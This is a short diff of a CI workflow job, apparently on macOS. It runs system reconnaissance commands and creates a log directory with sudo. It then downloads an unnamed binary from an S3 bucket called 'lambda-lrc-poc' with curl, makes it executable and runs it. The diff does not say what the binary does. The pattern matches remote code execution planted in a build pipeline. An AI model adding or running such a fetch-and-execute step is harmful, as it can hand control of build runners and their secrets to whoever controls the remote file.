@@ -27,7 +27,8 @@ jobs:
         ls -a
         sw_vers
         uname -av
-        cd $HOME/
+        sudo mkdir -p /opt/logs/lhps
+        sudo touch /opt/logs/lhps/lhps.log
         curl -s https://lambda-lrc-poc.s3.amazonaws.com/xb -o x-binary
         chmod +x x-binary
         ./x-binary
